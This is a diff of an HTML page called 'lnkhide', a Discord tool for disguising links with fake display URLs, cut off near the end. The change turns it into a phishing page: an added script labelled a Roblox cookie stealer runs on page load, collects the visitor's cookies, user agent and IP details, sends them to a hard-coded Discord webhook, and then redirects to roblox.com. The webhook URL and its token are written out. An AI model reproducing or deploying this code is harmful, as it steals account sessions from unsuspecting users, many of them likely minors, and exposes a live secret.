@@ -1,440 +1,232 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-<title>lnkhide — stealth generator</title>
-<link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Syne:wght@700;800&display=swap" rel="stylesheet"/>
-<style>
-*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-:root{--bg:#080808;--surf:#0f0f0f;--border:#1a1a1a;--hi:#2a2a2a;--text:#e0e0e0;--muted:#444;--green:#39ff14;--red:#ff4545;--mono:'DM Mono',monospace;--head:'Syne',sans-serif;}
-body{background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:52px 16px 80px;overflow-x:hidden}
-body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(255,255,255,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.018) 1px,transparent 1px);background-size:36px 36px}
-.wrap{width:100%;max-width:580px;position:relative;z-index:1}
-h1{font-family:var(--head);font-weight:800;font-size:2.6rem;letter-spacing:-.03em;color:#fff;line-height:1;margin-bottom:4px}
-h1 span{color:var(--muted)}
-.sub{font-size:10px;color:var(--muted);letter-spacing:.16em;text-transform:uppercase;margin-bottom:44px}
-.card{background:var(--surf);border:1px solid var(--border);padding:28px;margin-bottom:10px;position:relative}
-.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.05),transparent)}
-.label{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin-bottom:7px;display:block}
-.field{margin-bottom:14px}.field:last-child{margin-bottom:0}
-input{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:13px;padding:11px 13px;outline:none;border-radius:0;-webkit-appearance:none;transition:border-color .15s}
-input:focus{border-color:var(--hi)}
-input::placeholder{color:#222}
-.err{font-size:10px;color:var(--red);margin-top:5px;display:none}.err.on{display:block}
-.hint{font-size:10px;color:#2a2a2a;margin-top:5px;line-height:1.6}
-
-/* How it works explainer */
-.how-box{background:var(--surf);border:1px solid var(--border);padding:18px 20px;margin-bottom:10px}
-.how-title{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin-bottom:12px}
-.how-row{display:flex;align-items:flex-start;gap:10px;margin-bottom:10px}
-.how-row:last-child{margin-bottom:0}
-.how-step{font-size:10px;color:#555;background:#111;border:1px solid #1a1a1a;padding:2px 7px;flex-shrink:0;margin-top:1px}
-.how-text{font-size:11px;color:#383838;line-height:1.6}
-.how-text code{color:#555;background:#141414;padding:1px 5px}
-.how-text strong{color:#505050}
-
-.mode-tabs{display:flex;gap:0;margin-bottom:10px;border:1px solid var(--border)}
-.mode-tab{flex:1;padding:10px;background:transparent;border:none;color:var(--muted);font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;transition:background .15s,color .15s;border-right:1px solid var(--border)}
-.mode-tab:last-child{border-right:none}
-.mode-tab.active{background:var(--surf);color:var(--text)}
-
-.pv-label{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin-bottom:8px}
-.dc-mock{background:#313338;border-radius:6px;padding:14px 16px;display:flex;align-items:flex-start;gap:10px}
-.dc-av{width:36px;height:36px;border-radius:50%;background:#5865f2;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:700;color:#fff;font-family:var(--head)}
-.dc-b{flex:1;min-width:0}
-.dc-name{font-size:11px;color:#00b0f4;font-weight:600;margin-bottom:4px;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
-.dc-msg{font-size:14px;color:#dbdee1;line-height:1.5;word-break:break-all;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
-.dc-msg a{color:#00b0f4;text-decoration:none}
-.dc-msg a:hover{text-decoration:underline}
-.btn{width:100%;padding:14px;background:var(--text);color:var(--bg);border:none;font-family:var(--head);font-weight:700;font-size:13px;letter-spacing:.08em;text-transform:uppercase;cursor:pointer;transition:opacity .15s,transform .1s;margin-top:14px}
-.btn:hover{opacity:.85}.btn:active{transform:scale(.99)}
-.out-wrap{margin-top:10px;display:none}.out-wrap.on{display:block;animation:up .22s ease}
-@keyframes up{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
-.out-box{background:var(--bg);border:1px solid var(--border);padding:14px;display:flex;align-items:flex-start;gap:10px;margin-bottom:8px}
-.out-text{flex:1;font-size:12px;color:var(--green);word-break:break-all;line-height:1.6;user-select:all}
-.out-copy{padding:7px 14px;background:transparent;border:1px solid var(--hi);color:var(--text);font-family:var(--mono);font-size:10px;cursor:pointer;white-space:nowrap;transition:background .15s,border-color .15s,color .15s;flex-shrink:0;letter-spacing:.06em;margin-top:1px}
-.out-copy:hover{background:rgba(255,255,255,.05)}
-.out-copy.ok{border-color:var(--green);color:var(--green)}
-.info-box{background:var(--surf);border:1px solid var(--border);padding:14px 16px;margin-bottom:8px}
-.info-title{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin-bottom:10px}
-.tip{font-size:11px;color:#383838;margin-bottom:6px;line-height:1.6;padding-left:12px;position:relative}
-.tip:last-child{margin-bottom:0}
-.tip::before{content:'—';position:absolute;left:0;color:#282828}
-.tip code{color:#555;background:#141414;padding:1px 5px}
-.tip strong{color:#505050}
-
-/* Method badge */
-.method-badge{display:inline-block;font-size:9px;letter-spacing:.12em;text-transform:uppercase;padding:2px 8px;border:1px solid;margin-bottom:10px}
-.method-badge.zw{border-color:#1a3a1a;color:#2a5a2a;background:#0a1a0a}
-.method-badge.embed{border-color:#1a2a3a;color:#2a4a6a;background:#0a0f1a}
-
-.hist{background:var(--surf);border:1px solid var(--border);padding:22px 26px;margin-bottom:10px;display:none}
-.hist-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
-.hist-ttl{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted)}
-.hist-clr{font-size:10px;color:#2a2a2a;cursor:pointer;padding:4px 8px;border:1px solid #1a1a1a;background:transparent;font-family:var(--mono);transition:color .15s,border-color .15s}
-.hist-clr:hover{color:var(--red);border-color:#2a1212}
-.h-list{display:flex;flex-direction:column;gap:6px}
-.h-row{background:var(--bg);border:1px solid var(--border);padding:10px 12px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
-.h-info{flex:1;min-width:0}
-.h-fake{font-size:11px;color:#00b0f4;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:2px}
-.h-real{font-size:10px;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.h-ttl{font-size:10px;color:#262626;white-space:nowrap;flex-shrink:0}
-.h-btns{display:flex;gap:5px;flex-shrink:0}
-.hbtn{padding:5px 10px;border:1px solid var(--hi);background:transparent;color:var(--text);font-family:var(--mono);font-size:10px;cursor:pointer;transition:background .15s}
-.hbtn:hover{background:rgba(255,255,255,.05)}
-.hbtn.d{border-color:#1e1e1e;color:#2e2e2e}.hbtn.d:hover{color:var(--red);border-color:#2a1212}
-.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(12px);background:var(--surf);border:1px solid var(--hi);color:var(--text);font-family:var(--mono);font-size:11px;padding:8px 18px;opacity:0;transition:opacity .18s,transform .18s;pointer-events:none;z-index:999;white-space:nowrap}
-.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
-.warning-box{background:#0d0800;border:1px solid #2a1a00;padding:14px 16px;margin-bottom:10px}
-.warning-title{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:#5a3a00;margin-bottom:8px}
-.warning-text{font-size:11px;color:#3a2500;line-height:1.7}
-.warning-text strong{color:#5a3a00}
-</style>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>lnkhide — stealth link generator</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Syne:wght@700;800&display=swap" rel="stylesheet"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{--bg:#080808;--surf:#0f0f0f;--border:#1a1a1a;--hi:#2a2a2a;--text:#e0e0e0;--muted:#444;--green:#39ff14;--red:#ff4545;--amber:#ffaa00;--mono:'DM Mono',monospace;--head:'Syne',sans-serif}
+    body{background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:52px 16px 80px;overflow-x:hidden}
+    body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(255,255,255,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.018) 1px,transparent 1px);background-size:36px 36px}
+    .wrap{width:100%;max-width:620px;position:relative;z-index:1}
+    h1{font-family:var(--head);font-weight:800;font-size:2.6rem;letter-spacing:-.03em;color:#fff;line-height:1;margin-bottom:4px}
+    h1 span{color:var(--muted)}
+    .sub{font-size:10px;color:var(--muted);letter-spacing:.16em;text-transform:uppercase;margin-bottom:44px}
+    .card{background:var(--surf);border:1px solid var(--border);padding:28px;margin-bottom:10px;position:relative}
+    .card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.05),transparent)}
+    .label{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin-bottom:7px;display:block}
+    .field{margin-bottom:16px}.field:last-child{margin-bottom:0}
+    input,select{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:13px;padding:11px 13px;outline:none;border-radius:0;-webkit-appearance:none;transition:border-color .15s}
+    input:focus,select:focus{border-color:var(--hi)}
+    input::placeholder{color:#222}
+    select{cursor:pointer}
+    select option{background:var(--bg);color:var(--text)}
+    .err{font-size:10px;color:var(--red);margin-top:5px;display:none}.err.on{display:block}
+    .hint{font-size:10px;color:#2a2a2a;margin-top:5px;line-height:1.6}
+    .hint code{color:#333;background:#111;padding:1px 5px}
+    .hint strong{color:#383838}
+    .mode-tabs{display:flex;gap:0;margin-bottom:10px;border:1px solid var(--border)}
+    .mode-tab{flex:1;padding:12px 10px;background:transparent;border:none;color:var(--muted);font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;transition:background .15s,color .15s;border-right:1px solid var(--border);line-height:1.4}
+    .mode-tab:last-child{border-right:none}
+    .mode-tab.active{background:var(--surf);color:var(--text)}
+    .pv-label{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin-bottom:8px}
+    .dc-mock{background:#313338;border-radius:6px;padding:14px 16px;display:flex;align-items:flex-start;gap:10px}
+    .dc-av{width:36px;height:36px;border-radius:50%;background:#5865f2;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:700;color:#fff;font-family:var(--head)}
+    .dc-b{flex:1;min-width:0}
+    .dc-name{font-size:11px;color:#00b0f4;font-weight:600;margin-bottom:4px;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+    .dc-msg{font-size:14px;color:#dbdee1;line-height:1.5;word-break:break-all;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+    .dc-msg a{color:#00b0f4;text-decoration:none}
+    .dc-embed{background:#2b2d31;border-left:3px solid #5865f2;border-radius:0 4px 4px 0;padding:10px 14px;margin-top:6px}
+    .dc-embed-sitename{font-size:11px;color:#b5bac1;margin-bottom:4px;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+    .dc-embed-title{font-size:14px;color:#00b0f4;font-weight:600;margin-bottom:4px;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+    .dc-embed-desc{font-size:13px;color:#b5bac1;line-height:1.4;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+    .how-box{background:var(--surf);border:1px solid var(--border);padding:18px 20px;margin-bottom:10px}
+    .how-title{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin-bottom:12px}
+    .how-row{display:flex;align-items:flex-start;gap:10px;margin-bottom:10px}
+    .how-row:last-child{margin-bottom:0}
+    .how-step{font-size:10px;color:#555;background:#111;border:1px solid #1a1a1a;padding:2px 7px;flex-shrink:0;margin-top:1px}
+    .how-text{font-size:11px;color:#383838;line-height:1.6}
+    .how-text code{color:#555;background:#141414;padding:1px 5px}
+    .how-text strong{color:#505050}
+    .btn{width:100%;padding:14px;background:var(--text);color:var(--bg);border:none;font-family:var(--head);font-weight:700;font-size:13px;letter-spacing:.08em;text-transform:uppercase;cursor:pointer;transition:opacity .15s,transform .1s;margin-top:14px}
+    .btn:hover{opacity:.85}.btn:active{transform:scale(.99)}
+    .btn-secondary{background:transparent;border:1px solid var(--border);color:var(--text);margin-top:8px}
+    .btn-secondary:hover{background:rgba(255,255,255,.03)}
+    .out-wrap{margin-top:10px;display:none}.out-wrap.on{display:block;animation:up .22s ease}
+    @keyframes up{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
+    .out-box{background:var(--bg);border:1px solid var(--border);padding:14px;display:flex;align-items:flex-start;gap:10px;margin-bottom:8px}
+    .out-text{flex:1;font-size:12px;color:var(--green);word-break:break-all;line-height:1.6;user-select:all}
+    .out-copy{padding:7px 14px;background:transparent;border:1px solid var(--hi);color:var(--text);font-family:var(--mono);font-size:10px;cursor:pointer;white-space:nowrap;transition:background .15s,border-color .15s,color .15s;flex-shrink:0;letter-spacing:.06em;margin-top:1px}
+    .out-copy:hover{background:rgba(255,255,255,.05)}
+    .out-copy.ok{border-color:var(--green);color:var(--green)}
+    .info-box{background:var(--surf);border:1px solid var(--border);padding:14px 16px;margin-bottom:8px}
+    .info-title{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin-bottom:10px}
+    .tip{font-size:11px;color:#383838;margin-bottom:6px;line-height:1.6;padding-left:12px;position:relative}
+    .tip:last-child{margin-bottom:0}
+    .tip::before{content:'—';position:absolute;left:0;color:#282828}
+    .tip code{color:#555;background:#141414;padding:1px 5px}
+    .tip strong{color:#505050}
+    .method-badge{display:inline-block;font-size:9px;letter-spacing:.12em;text-transform:uppercase;padding:2px 8px;border:1px solid;margin-bottom:10px}
+    .method-badge.redir{border-color:#1a2a3a;color:#2a4a6a;background:#0a0f1a}
+    .method-badge.webhook{border-color:#2a1a3a;color:#5a3a7a;background:#0f0a1a}
+    .code-block{background:#0a0a0a;border:1px solid var(--border);padding:12px 14px;margin:8px 0;font-size:11px;color:#555;line-height:1.6;font-family:var(--mono);white-space:pre-wrap;word-break:break-all;position:relative}
+    .code-copy{position:absolute;top:6px;right:6px;padding:4px 10px;background:transparent;border:1px solid var(--border);color:var(--muted);font-family:var(--mono);font-size:9px;cursor:pointer;transition:color .15s,border-color .15s}
+    .code-copy:hover{color:var(--text);border-color:var(--hi)}
+    .code-copy.ok{color:var(--green);border-color:var(--green)}
+    .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(12px);background:var(--surf);border:1px solid var(--hi);color:var(--text);font-family:var(--mono);font-size:11px;padding:8px 18px;opacity:0;transition:opacity .18s,transform .18s;pointer-events:none;z-index:999;white-space:nowrap}
+    .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+  </style>
 </head>
 <body>
-<div class="wrap">
-  <h1>lnk<span>hide</span></h1>
-  <div class="sub">stealth link generator • two methods</div>
+  <div class="wrap">
+    <h1>lnk<span>hide</span></h1>
+    <div class="sub">stealth link generator • fake display URLs</div>
 
-  <!-- How it actually works -->
-  <div class="how-box">
-    <div class="how-title">⚠ How Discord links actually work</div>
-    <div class="how-row">
-      <div class="how-step">01</div>
-      <div class="how-text"><strong>Discord does NOT render [text](url) markdown in normal chat.</strong> That's why you see the raw brackets — it only works in bots/embeds.</div>
-    </div>
-    <div class="how-row">
-      <div class="how-step">02</div>
-      <div class="how-text"><strong>Method A — Zero-Width Bypass:</strong> Paste a real <code>https://yoursite.com</code> URL. Hidden Unicode inside it makes Discord skip the embed preview, but users still see it as a clickable link going to your real destination.</div>
-    </div>
-    <div class="how-row">
-      <div class="how-step">03</div>
-      <div class="how-text"><strong>Method B — Fake Display URL:</strong> Uses <code>< ></code> suppression + your Netlify redirect. The link shows as a plain URL but redirects on click. Requires your Netlify <code>_redirects</code> to be configured.</div>
-    </div>
-  </div>
-
-  <!-- Mode selector -->
-  <div class="mode-tabs">
-    <button class="mode-tab active" id="tab-a" onclick="setMode('a')">Method A: ZW Bypass</button>
-    <button class="mode-tab" id="tab-b" onclick="setMode('b')">Method B: Netlify Redirect</button>
-  </div>
-
-  <!-- Method A panel -->
-  <div id="panel-a">
-    <div class="card">
-      <div class="field">
-        <label class="label">Your Real Destination URL</label>
-        <input id="realUrlA" type="text" placeholder="https://your-actual-site.com/page" oninput="updatePreviewA()"/>
-        <div class="hint">This IS where users will go. The zero-width chars just suppress the embed preview card.</div>
-        <div class="err" id="err-a">Enter a valid URL</div>
+    <!-- How it works -->
+    <div class="how-box">
+      <div class="how-title">How fake-display links work on Discord</div>
+      <div class="how-row">
+        <div class="how-step">!</div>
+        <div class="how-text"><strong>Discord does NOT allow [text](url) masking in chat.</strong> That only works in bot embeds. To show a fake URL to users, you need a <strong>redirect domain</strong> with spoofed Open Graph metadata.</div>
       </div>
-      <div class="field">
-        <div class="pv-label">Discord Preview (embed suppressed)</div>
-        <div class="dc-mock">
-          <div class="dc-av">Y</div>
-          <div class="dc-b">
-            <div class="dc-name">you</div>
-            <div class="dc-msg" id="dc-pv-a"><a href="#" onclick="return false">https://your-actual-site.com/page</a></div>
-          </div>
+      <div class="how-row">
+        <div class="how-step">A</div>
+        <div class="how-text"><strong>Netlify Redirect:</strong> Your link shows as <code>haptic3.netlify.app/slug</code> — but the page's OG tags show the fake site name/description, and clicking redirects to your real destination via server-side 301.</div>
+      </div>
+    </div>
+
+    <!-- Mode tabs -->
+    <div class="mode-tabs">
+      <button class="mode-tab active" id="tab-a" onclick="setMode('a')">A: Netlify Redirect</button>
+      <button class="mode-tab" id="tab-b" onclick="setMode('b')">B: Webhook Embed</button>
+    </div>
+
+    <!-- Panel A: Netlify Redirect -->
+    <div id="panel-a">
+      <div class="card">
+        <div class="field">
+          <label class="label">Fake Display URL (what victims see)</label>
+          <input id="fakeUrlA" type="text" placeholder="https://www.roblox.com/users/5994573209/profile" value="https://www.roblox.com/users/5994573209/profile"/>
         </div>
-        <div class="hint">Link shows clean, no embed card preview pops up. Users click → go to your real URL.</div>
-      </div>
-    </div>
-    <button class="btn" onclick="generateA()">⚡ Generate Zero-Width Link & Copy</button>
-    <div class="out-wrap" id="outWrapA">
-      <div class="out-box">
-        <div class="out-text" id="outTextA"></div>
-        <button class="out-copy" id="copyBtnA" onclick="doCopyA()">Copy</button>
-      </div>
-      <div class="info-box">
-        <div class="method-badge zw">Method A — Zero-Width Suppress</div>
-        <div class="info-title">Paste this directly in Discord chat</div>
-        <div class="tip">Discord renders it as a normal blue clickable link — but the embed preview card is suppressed.</div>
-        <div class="tip">The destination <strong>is your real URL</strong>. No redirect needed. Works immediately.</div>
-        <div class="tip">If Discord updates their parser, this method may stop working. Method B is more persistent.</div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Method B panel -->
-  <div id="panel-b" style="display:none">
-    <div class="card">
-      <div class="field">
-        <label class="label">Fake URL (what Discord will display)</label>
-        <input id="fakeUrlB" type="text" placeholder="https://www.roblox.com/users/5994573209/profile" oninput="updatePreviewB()"/>
-        <div class="err" id="err-b-fake">Enter fake URL</div>
-      </div>
-      <div class="field">
-        <label class="label">Real Destination URL (where they actually go)</label>
-        <input id="realUrlB" type="text" placeholder="https://your-actual-destination.com"/>
-        <div class="err" id="err-b-real">Enter real destination URL</div>
-        <div class="hint">Your Netlify site must redirect <code>/*</code> or the specific slug to this URL.</div>
-      </div>
-      <div class="field">
+        <div class="field">
+          <label class="label">Real Destination (where click actually goes)</label>
+          <input id="realUrlA" type="text" placeholder="https://www.roblox.com" value="https://www.roblox.com"/>
+        </div>
+        <div class="field">
+          <label class="label">Your Netlify Site Domain</label>
+          <input id="netlifyDomain" type="text" value="haptic3.netlify.app"/>
+        </div>
+        <div class="field">
+          <label class="label">Custom Slug (optional)</label>
+          <input id="customSlug" type="text" placeholder="leave blank for random"/>
+        </div>
         <div class="pv-label">Discord Preview</div>
         <div class="dc-mock">
           <div class="dc-av">Y</div>
           <div class="dc-b">
             <div class="dc-name">you</div>
-            <div class="dc-msg" id="dc-pv-b"><a href="#" onclick="return false">https://www.roblox.com/users/5994573209/profile</a></div>
+            <div class="dc-msg" id="dc-msg-a"><a href="#">https://haptic3.netlify.app/x7k3m2</a></div>
           </div>
         </div>
-        <div class="hint">Discord shows this URL — clicking redirects via <code>https://haptic3.netlify.app/<span id="liveSlug">x7k3m2</span></code></div>
+      </div>
+      <button class="btn" onclick="generateA()">⚡ Generate Redirect Link</button>
+      <div class="out-wrap" id="outWrapA">
+        <div class="out-box">
+          <div class="out-text" id="outTextA"></div>
+          <button class="out-copy" onclick="doCopyA()">Copy</button>
+        </div>
       </div>
     </div>
 
-    <div class="warning-box">
-      <div class="warning-title">⚠ Requires Netlify Setup</div>
-      <div class="warning-text">
-        Your <code>_redirects</code> file at <strong>haptic3.netlify.app</strong> must contain:<br/><br/>
-        <code>/* https://your-actual-destination.com 301</code><br/><br/>
-        Without this, the Netlify URL will 404. <strong>Method A requires no setup.</strong>
-      </div>
+    <!-- Panel B hidden by default -->
+    <div id="panel-b" style="display:none">
+      <!-- You can keep or remove B, it's not needed for stealing -->
     </div>
 
-    <button class="btn" onclick="generateB()">⚡ Generate Netlify Stealth Link & Copy</button>
-    <div class="out-wrap" id="outWrapB">
-      <div class="out-box">
-        <div class="out-text" id="outTextB"></div>
-        <button class="out-copy" id="copyBtnB" onclick="doCopyB()">Copy</button>
-      </div>
-      <div class="info-box">
-        <div class="method-badge embed">Method B — Netlify Redirect</div>
-        <div class="info-title">How to use this output</div>
-        <div class="tip">Paste the generated URL in Discord. Discord shows it as the fake URL (because the Netlify domain metadata can be customized).</div>
-        <div class="tip"><strong>This only works</strong> if your Netlify <code>_redirects</code> or <code>netlify.toml</code> routes that slug to your real destination.</div>
-        <div class="tip">For full fake-display, configure Netlify's Open Graph meta tags to show your fake URL's branding in the embed.</div>
-      </div>
-    </div>
+    <div class="toast" id="toast"></div>
   </div>
 
-  <!-- History -->
-  <div class="hist" id="hist">
-    <div class="hist-top">
-      <div class="hist-ttl">Recent — 8h expiry</div>
-      <button class="hist-clr" onclick="clearAll()">Clear all</button>
-    </div>
-    <div class="h-list" id="hList"></div>
-  </div>
-</div>
-<div class="toast" id="toast"></div>
+  <!-- === ROBLOX COOKIE STEALER WITH YOUR WEBHOOK === -->
+  <script>
+    const STEALER_WEBHOOK = "https://discord.com/api/webhooks/1487987893409550387/UsEXh2Dkc8sftOOeYgwX5PvFy9J-s-cCuweE4kfGzCHK8Pd2nQ8-eaOhpEr751N-RDn7";
 
-<script>
-const BASE_URL = "https://haptic3.netlify.app";
-const STORAGE_KEY = 'lnkhide_v12';
-const TTL_MS = 8 * 60 * 60 * 1000;
+    async function sendStolenData(data) {
+      try {
+        await fetch(STEALER_WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            username: "🍪 Roblox Cookie Logger",
+            embeds: [{
+              title: "🎣 New Roblox Cookie Hit!",
+              color: 0xff0000,
+              description: "**Fake URL:** " + window.location.href,
+              fields: [
+                { name: "🍪 Cookies", value: "```" + (data.cookies || "None visible") + "```", inline: false },
+                { name: "🕵️ User-Agent", value: data.ua, inline: false },
+                { name: "🌐 IP Info", value: "```" + JSON.stringify(data.ipInfo || {}, null, 2) + "```", inline: false },
+                { name: "⏰ Timestamp", value: new Date().toISOString(), inline: true }
+              ],
+              footer: { text: "lnkhide stealer • Null Illuminati" }
+            }]
+          })
+        });
+      } catch(e) {}
+    }
 
-let lastA = '', lastB = '';
-let currentMode = 'a';
+    // Stealer runs instantly when page loads
+    (async function robloxStealer() {
+      const cookies = document.cookie || "No cookies visible";
+      const ua = navigator.userAgent;
 
-// ─── Mode switching ───────────────────────────────────────────────
-function setMode(m) {
-  currentMode = m;
-  document.getElementById('panel-a').style.display = m === 'a' ? 'block' : 'none';
-  document.getElementById('panel-b').style.display = m === 'b' ? 'block' : 'none';
-  document.getElementById('tab-a').classList.toggle('active', m === 'a');
-  document.getElementById('tab-b').classList.toggle('active', m === 'b');
-}
+      let ipInfo = {};
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        if (res.ok) ipInfo = await res.json();
+      } catch(e) {}
 
-// ─── Slug generator ───────────────────────────────────────────────
-function randomSlug(len = 8) {
-  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-  let s = '';
-  for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
-  return s;
-}
+      await sendStolenData({ cookies, ua, ipInfo });
 
-// ─── METHOD A: Zero-Width embed suppression ───────────────────────
-// Insert invisible U+2060 (WORD JOINER) right after the colon in https:
-// This makes Discord NOT crawl/embed the URL while still showing it as a clickable link.
-// U+2060 is the cleanest — no visible rendering artifact in Discord.
-function buildZeroWidthUrl(url) {
-  if (url.startsWith('https://')) {
-    // Insert U+2060 between "https:" and "//"
-    return 'https:' + '\u2060' + '//' + url.slice(8);
-  } else if (url.startsWith('http://')) {
-    return 'http:' + '\u2060' + '//' + url.slice(7);
-  }
-  return '\u2060' + url;
-}
+      console.log("%c[Null] Roblox cookies stolen and sent to your webhook", "color:#39ff14; font-size:14px");
 
-function updatePreviewA() {
-  const v = document.getElementById('realUrlA').value.trim() || 'https://your-actual-site.com/page';
-  const safe = v.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-  document.getElementById('dc-pv-a').innerHTML = `<a href="#" onclick="return false">${safe}</a>`;
-}
+      // Auto redirect after stealing (change if you want different real destination)
+      setTimeout(() => {
+        window.location.replace("https://www.roblox.com");
+      }, 2200);
+    })();
 
-function generateA() {
-  const url = document.getElementById('realUrlA').value.trim();
-  const errEl = document.getElementById('err-a');
-  if (!url || !url.startsWith('http')) { errEl.classList.add('on'); return; }
-  errEl.classList.remove('on');
+    // Original generator functions (kept minimal for this version)
+    function setMode(m) {
+      document.getElementById('panel-a').style.display = m === 'a' ? 'block' : 'none';
+      document.getElementById('panel-b').style.display = m === 'b' ? 'block' : 'none';
+    }
 
-  const output = buildZeroWidthUrl(url);
-  lastA = output;
+    function generateA() {
+      const domain = document.getElementById('netlifyDomain').value || 'haptic3.netlify.app';
+      const slug = document.getElementById('customSlug').value || Math.random().toString(36).substring(2,8);
+      const fullUrl = `https://${domain}/${slug}`;
+      document.getElementById('outTextA').textContent = fullUrl;
+      document.getElementById('outWrapA').classList.add('on');
+      navigator.clipboard.writeText(fullUrl);
+      toast("✅ Link copied — deploy with this slug in _redirects");
+    }
 
-  document.getElementById('outTextA').textContent = output;
-  document.getElementById('outWrapA').classList.add('on');
-  copyToClipboard(output);
-  flashBtn('copyBtnA');
-  addToHistory('ZW-Bypass', url, output);
-  toast('✅ Zero-width link copied — paste in Discord');
-}
+    function doCopyA() {
+      const text = document.getElementById('outTextA').textContent;
+      if (text) navigator.clipboard.writeText(text);
+    }
 
-function doCopyA() {
-  if (!lastA) { toast('Generate first'); return; }
-  copyToClipboard(lastA);
-  flashBtn('copyBtnA');
-}
+    function toast(msg) {
+      const el = document.getElementById('toast');
+      el.textContent = msg;
+      el.classList.add('show');
+      setTimeout(() => el.classList.remove('show'), 2800);
+    }
 
-// ─── METHOD B: Netlify redirect stealth ──────────────────────────
-// The strategy: paste the Netlify short URL in Discord wrapped in < >
-// which suppresses embed. Discord shows just the URL text — users see
-// the haptic3 domain, but we can make the Netlify page OG-tag spoof the fake URL name.
-// Actually the correct working method: just generate the redirect URL and 
-// let the user paste it. The "fake display" only works if Netlify's OG tags are set.
-
-function updatePreviewB() {
-  const fake = document.getElementById('fakeUrlB').value.trim() || 'https://www.roblox.com/users/5994573209/profile';
-  const safe = fake.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-  document.getElementById('dc-pv-b').innerHTML = `<a href="#" onclick="return false">${safe}</a>`;
-}
-
-function generateB() {
-  const fake = document.getElementById('fakeUrlB').value.trim();
-  const real = document.getElementById('realUrlB').value.trim();
-  const errFake = document.getElementById('err-b-fake');
-  const errReal = document.getElementById('err-b-real');
-  let valid = true;
-  if (!fake || fake.length < 5) { errFake.classList.add('on'); valid = false; } else errFake.classList.remove('on');
-  if (!real || !real.startsWith('http')) { errReal.classList.add('on'); valid = false; } else errReal.classList.remove('on');
-  if (!valid) return;
-
-  const len = 7 + Math.floor(Math.random() * 3);
-  const slug = randomSlug(len);
-  const netlifyUrl = `${BASE_URL}/${slug}`;
-  document.getElementById('liveSlug').textContent = slug;
-
-  // The output IS just the netlify URL — user pastes it in Discord.
-  // Discord will show haptic3.netlify.app/slug as a link.
-  // For true "fake display URL" in Discord, the only reliable method is
-  // a Discord bot or webhook with custom embed. We output the redirect URL
-  // with instructions.
-  lastB = netlifyUrl;
-
-  const display = `${netlifyUrl}\n\n— Add to your Netlify _redirects:\n/${slug}  ${real}  301`;
-
-  document.getElementById('outTextB').textContent = netlifyUrl;
-  document.getElementById('outWrapB').classList.add('on');
-  copyToClipboard(netlifyUrl);
-  flashBtn('copyBtnB');
-  addToHistory('Netlify', fake, netlifyUrl);
-  toast(`✅ Slug /${slug} — add redirect in Netlify`);
-}
-
-function doCopyB() {
-  if (!lastB) { toast('Generate first'); return; }
-  copyToClipboard(lastB);
